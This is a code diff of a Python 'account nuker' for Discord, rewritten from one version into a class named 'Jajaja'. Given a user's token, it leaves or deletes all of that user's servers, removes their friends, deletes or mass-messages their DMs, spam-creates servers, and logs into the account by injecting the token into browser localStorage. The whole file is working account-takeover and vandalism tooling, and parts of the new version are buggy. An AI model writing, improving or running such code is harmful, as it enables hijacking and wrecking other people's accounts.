@@ -1,192 +1,187 @@
-# Account nuker fixed by https://github.com/iiLeafy
-import threading, requests, discord, random, time, os
+# credit: https://github.com/fweak for 50% of recode
 
-from colorama import Fore, init
+import requests
+import platform
+import os
+import time
+import threading
+import json
+
 from selenium import webdriver
-from datetime import datetime
-from itertools import cycle
-
+from colorama import init, Fore
 init(convert=True)
-guildsIds = []
-friendsIds = []
-channelIds = []
-clear = lambda: os.system('cls')
-clear()
 
-class Login(discord.Client):
-    async def on_connect(self):
-        for g in self.guilds:
-            guildsIds.append(g.id)
- 
-        for f in self.user.friends:
-            friendsIds.append(f.id)
+CHROME_DRIVER_PATH = 'chromedriver.exe'
 
-        for c in self.private_channels:
-            channelIds.append(c.id)
+class Jajaja:
+    def __init__(self, token: str, thread_count: str):
+        self.threads = list()
+        self.thread_count = int(thread_count)
+        self.headers = {
+            'authorization': token,
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36'
+        }
 
-        await self.logout()
 
-    def run(self, token):
+    @staticmethod
+    def replace_all(query: str, what: list, _with: list):
+        for x in range(0, len(_with)):
+            to_with = _with[x]
+            to_what = what[x]
+
+            if to_what in query:
+                query = query.replace(to_what, to_with)
+        return query
+
+
+    @staticmethod
+    def clear_console():
+        if platform.system() == 'Windows':
+            os.system('cls')
+        else:
+            os.system('clear')
+
+    @staticmethod
+    def ask(query: str):
+        print(query, end='')
+        return input(': ')
+
+    @staticmethod
+    def ratelimit(self, status:int, body:str):
         try:
-            super().run(token, bot=False)
-        except Exception as e:
-            print(f"[{Fore.RED}-{Fore.RESET}] Invalid token", e)
-            input("Press any key to exit..."); exit(0)
+            if status == 429:
+                data = json.loads(body)
+                print(f'[Jajaja] -> Discord Ratelimit :: {data["retry_after"]}')
+                time.sleep(body["retry_after"])
+                pass
+        except:
+            pass
 
-def tokenLogin(token):
-    opts = webdriver.ChromeOptions()
-    opts.add_experimental_option("detach", True)
-    driver = webdriver.Chrome('chromedriver.exe', options=opts)
-    script = """
-            function login(token) {
-            setInterval(() => {
-            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
-            }, 50);
-            setTimeout(() => {
-            location.reload();
-            }, 2500);
-            }
-            """
-    driver.get("https://discord.com/login")
-    driver.execute_script(script + f'\nlogin("{token}")')
+    # Start of methods
+    def get_all_guilds(self) -> list:
+        servers = list()
+        request = requests.get('https://discord.com/api/v8/users/@me/guilds', headers=self.headers)
 
-def tokenInfo(token):
-    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
-    r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
-    if r.status_code == 200:
-            userName = r.json()['username'] + '#' + r.json()['discriminator']
-            userID = r.json()['id']
-            phone = r.json()['phone']
-            email = r.json()['email']
-            mfa = r.json()['mfa_enabled']
-            print(f'''
-            [{Fore.RED}User ID{Fore.RESET}]         {userID}
-            [{Fore.RED}User Name{Fore.RESET}]       {userName}
-            [{Fore.RED}2 Factor{Fore.RESET}]        {mfa}
+        for server in request.json():
+            servers.append(server['id'])
 
-            [{Fore.RED}Email{Fore.RESET}]           {email}
-            [{Fore.RED}Phone number{Fore.RESET}]    {phone if phone else ""}
-            [{Fore.RED}Token{Fore.RESET}]           {token}
+        return servers
 
-            ''')
-            input()
+    def get_all_friends(self) -> list:
+        friends = list()
+        request = requests.get('https://discord.com/api/v6/users/@me/relationships', headers=self.headers)
 
-def tokenFuck(token):
-    headers = {'Authorization': token}
-    gdel = input(f'Would you like to delete all guilds on this account. y/n [No Capitals] > ')
-    fdel = input('Would you like to remove all friends on this account. y/n [No Capitals] > ')
-    sendall = input('Would you like to send a dm to all recent dms on this account. y/n [No Capitals] > ')
-    fremove = input('Would you like to remove all recent dms on this account. y/n [No Capitals] > ')
-    gleave = input('Would you like to leave all guilds on this account. y/n [No Capitals] > ')
-    gcreate = input('Would you like to spam create guilds on this account.  y/n [No Capitals] > ')
-    dlmode = input('Would you like to spam change through light and dark mode. y/n [No Capitals] > ')
-    langspam = input('Would you like to spam change the user\'s language. y/n [No Capitals] > ')
-    print(f"[{Fore.RED}+{Fore.RESET}] Nuking...")
+        for friend in request.json():
+            friends.append(friend['id'])
 
-    if sendall == 'y':
-        try:
-            sendmessage = input('What do you want to send to everyone on the recent dms. > ')
-            for id in channelIds:
-                requests.post(f'https://discord.com/api/v8/channels/{id}/messages', headers=headers, data={"content": f"{sendmessage}"})
-                print(f'Sent message to private channel ID of {id}')
-        except Exception as e:
-            print(f'Error detected, ignoring. {e}')
+        return friends
 
-    if gleave == 'y':
-        try:
-            for guild in guildsIds:
-                requests.delete(f'https://discord.com/api/v8/users/@me/guilds/{guild}', headers=headers)
-                print(f'Left guild {guild}')
-        except Exception as e:
-            print(f'Error detected, ignoring. {e}')
+    def remove_friends(self, friend_id: str):
+        request = requests.delete(f'https://discord.com/api/v8/users/@me/relationships/{friend_id}', headers=self.headers)
 
-    if fdel == 'y':
-        try:
-            for friend in friendsIds:
-                requests.delete(f'https://discord.com/api/v8/users/@me/relationships/{friend}', headers=headers)
-                print(f'Removed friend {friend}')
-        except Exception as e:
-            print(f'Error detected, ignoring. {e}')
+        self.ratelimit(status=request.status_code, body=request.json())
 
-    if fremove == 'y':
-        try:
-            for id in channelIds:
-                requests.delete(f'https://discord.com/api/v8/channels/{id}', headers=headers)
-                print(f'Removed private channel ID {id}')
-        except Exception as e:
-            print(f'Error detected, ignoring. {e}')
+        return
 
-    if gdel == 'y':
-        try:
-            for guild in guildsIds:
-                requests.delete(f'https://discord.com/api/v8/guilds/{guild}', headers=headers)
-                print(f'Deleted guild {guild}')
-        except Exception as e:
-            print(f'Error detected, ignoring. {e}')
+    def remove_servers(self, server_id: str):
+        request = requests.delete(f'https://discord.com/api/v8/users/@me/guilds/{server_id}', headers=self.headers)
 
-    if gcreate == 'y':
-        try:
-            gname = input('What would you like the spammed server name be. > ')
-            gserv = input('How many servers would you like to be made. [max is 100 by discord]')
-            for i in range(int(gserv)):
-                payload = {'name': f'{gname}', 'region': 'europe', 'icon': None, 'channels': None}
-                requests.post('https://discord.com/api/v6/guilds', headers=headers, json=payload)
-                print(f'Server {gname} made. Count: {i}')
-        except Exception as e:
-            print(f'Error detected, ignoring. {e}')
+        self.ratelimit(status=request.status_code, body=request.json())
+        print(request.json())
+        input()
+        return True
 
-    if dlmode == 'y':
-        try:
-            modes = cycle(["light", "dark"])
-        except Exception as e:
-            print(f'Error detected, ignoring. {e}')
+    def token_login(self):
+        opts = webdriver.ChromeOptions()
+        opts.add_experimental_option('detach', True)
+        driver = webdriver.Chrome(CHROME_DRIVER_PATH, options=opts)
+        script = '''
+            const login = (token) => {
+                setInterval(() => document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`, 50);
+                setTimeout(() => location.reload(), 2500);
+            };''' + f'login("{self.token}")'
 
-    if langspam == 'y':
-        try:
-            while True:
-                setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'de', 'lt', 'lv', 'fi', 'se'])}
-                requests.patch("https://discord.com/api/v8/users/@me/settings", headers=headers, json=setting)
-        except Exception as e:
-            print(f'Error detected, ignoring. {e}')
+        driver.get('https://discord.com/login')
+        driver.execute_script(script)
 
-    time.sleep(9999)
+    def token_info(self):
+        for key, value in self.user.items():
+            print(f'{Fore.YELLOW}{key}{Fore.RESET}:', value)
+        input('press Enter to go back')
 
-def getBanner():
-    banner = f'''
-                [{Fore.RED}1{Fore.RESET}] Token fuck the account
-                [{Fore.RED}2{Fore.RESET}] Grab info about the account
-                [{Fore.RED}3{Fore.RESET}] Log into a token
+    def check_token(self) -> bool:
+        request = requests.get('https://discord.com/api/v8/users/@me', headers=self.headers)
 
-    '''.replace('░', f'{Fore.RED}░{Fore.RESET}')
-    return banner
+        if request.status_code == 200:
+            self.user = request.json()
+            return True
+        else:
+            return False
 
-def startMenu():
-    print(getBanner())
-    print(f'[{Fore.RED}>{Fore.RESET}] Your choice', end=''); choice = str(input('  :  '))
+    def thread_requests(self, command: str):
+        if command == '1':
+            friends = self.get_all_friends()
+            servers = self.get_all_guilds()
 
-    if choice == '1':
-        print(f'[{Fore.RED}>{Fore.RESET}] Account token', end=''); token = input('  :  ')
-        print(f'[{Fore.RED}>{Fore.RESET}] Threads amount (number)', end=''); threads = input('  :  ')
-        Login().run(token)
-        if threading.active_count() < int(threads):
-            t = threading.Thread(target=tokenFuck, args=(token, ))
-            t.start()
+            for friend in friends:
+                if threading.active_count() < self.thread_count:
+                    thread = threading.Thread(target=self.remove_friends, args=(friend,))
+                    thread.start()
+                    thread.join()
 
-    elif choice == '2':
-        print(f'[{Fore.RED}>{Fore.RESET}] Account token', end=''); token = input('  :  ')
-        tokenInfo(token)
-    
-    elif choice == '3':
-        print(f'[{Fore.RED}>{Fore.RESET}] Account token', end=''); token = input('  :  ')
-        tokenLogin(token)
+            for server in servers:
+                if threading.active_count() < self.thread_count:
+                    thread = threading.Thread(target=self.remove_servers, args=(server,))
+                    thread.start()
+                    thread.join()
 
-    elif choice.isdigit() == False:
-        clear()
-        startMenu()
+        elif command == '2':
+            self.token_login()
+        elif command == '3':
+            self.token_info()
+        else:
+            exit()
 
-    else:
-        clear()
-        startMenu()
-        
+    def display_banner(self):
+        return self.replace_all(f'''
+               (      )  (      )  (      )
+               )\  ( /(  )\  ( /(  )\  ( /(
+              ((_) )(_))((_) )(_))((_) )(_))
+                ! ((_)_   ! ((_)_   ! ((_)_
+               | |/ _` | | |/ _` | | |/ _` |
+              _/ |\__,_|_/ |\__,_|_/ |\__,_|
+             |__/      |__/      |__/
+
+            {Fore.YELLOW}════════════════════════════════════{Fore.RESET}
+        ''', [')', '('], [f'{Fore.YELLOW}){Fore.RESET}', f'{Fore.RED}({Fore.RESET}'])
+
+    def input_loop(self):
+        self.clear_console()
+
+        print(self.display_banner() + f'''
+            [{Fore.YELLOW}1{Fore.RESET}] token fuck
+            [{Fore.YELLOW}2{Fore.RESET}] token login
+            [{Fore.YELLOW}3{Fore.RESET}] token info
+            [{Fore.YELLOW}4{Fore.RESET}] exit
+        ''')
+        cmd = input('> ')
+
+        self.clear_console()
+
+        if cmd in ['1', '2', '3', '4']:
+            self.thread_requests(command=cmd)
+            return self.input_loop()
+        else:
+            return self.input_loop()
+
 if __name__ == '__main__':
-    startMenu()
+    token = Jajaja.ask(f'[{Fore.YELLOW}>{Fore.RESET}] Enter Token')
+    threads = Jajaja.ask(f'[{Fore.YELLOW}>{Fore.RESET}] Enter Threads')
+
+    client = Jajaja(token, threads)
+    if not client.check_token():
+        print(f'[{Fore.YELLOW}!{Fore.RESET}] Invalid token input.')
+    else:
+        client.input_loop()
+
+    input('\nPress ENTER to exit...\n')
